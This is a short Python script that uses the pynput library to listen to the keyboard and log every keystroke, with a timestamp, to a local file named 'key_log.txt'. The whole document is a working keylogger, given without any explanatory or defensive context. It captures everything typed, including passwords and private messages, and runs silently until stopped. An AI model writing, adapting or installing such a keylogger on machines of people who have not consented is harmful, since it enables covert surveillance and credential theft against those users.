from pynput.keyboard import Key, Listener
import logging

file_log = 'key_log.txt'


def on_press(key):
    logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(asctime)s: %(message)s')
    logging.log(10, str(key))


with Listener(on_press=on_press) as listener:
    listener.join()
